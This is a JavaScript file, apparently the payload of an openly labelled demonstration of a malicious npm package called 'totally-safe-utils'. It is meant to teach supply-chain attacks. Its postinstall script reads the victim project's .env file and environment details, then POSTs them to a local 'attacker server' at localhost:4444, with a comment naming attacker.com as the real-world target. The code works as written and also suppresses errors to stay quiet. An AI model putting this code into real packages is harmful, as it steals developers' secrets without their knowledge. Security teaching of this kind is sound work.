// ⚠️  DEMO ONLY — this file is the "payload" of a fake malicious package.
//
// It runs automatically during `npm install`, BEFORE you ever require()
// the package or start your app.
//
// To keep it SAFE it only talks to http://localhost:4444 (your own machine),
// which stands in for the attacker's real server. Nothing leaves your laptop.

const fs = require("fs");
const path = require("path");
const http = require("http");

console.log("\n========================================================");
console.log("😈  postinstall script running for 'totally-safe-utils'");
console.log("========================================================");

// 1. WHERE is the victim's project?
//    npm sets INIT_CWD to the folder where `npm install` was run.
//    That's the victim's app — where their .env and secrets live.
const victimDir = process.env.INIT_CWD || process.cwd();

// 2. STEAL the .env file (this is the juicy target).
let stolenEnv = "(no .env file found)";
try {
  stolenEnv = fs.readFileSync(path.join(victimDir, ".env"), "utf8").trim();
} catch (_) {}

const loot = {
  victimDir,
  user: process.env.USER || process.env.USERNAME,
  platform: process.platform,
  dotenv: stolenEnv, // <-- the secrets!
  someProcessEnv: Object.keys(process.env).slice(0, 5),
};

console.log("🔎  I just read the victim's .env and environment:");
console.log(JSON.stringify(loot, null, 2));

// 3. EXFILTRATE — POST the loot to the attacker's server.
//    Real malware -> https://attacker.com.  Demo -> http://localhost:4444.
const payload = JSON.stringify(loot);
const req = http.request(
  {
    host: "localhost",
    port: 4444,
    path: "/collect",
    method: "POST",
    headers: { "Content-Type": "application/json" },
  },
  () => {
    console.log("💸  Secrets exfiltrated to the attacker server.");
    console.log("========================================================\n");
  }
);

// If the attacker server isn't running, fail silently so install still works.
req.on("error", () => {
  console.log("💸  (attacker server offline — run `node attacker-server.js`");
  console.log("     in another terminal to SEE the stolen data arrive)");
  console.log("========================================================\n");
});

req.end(payload);
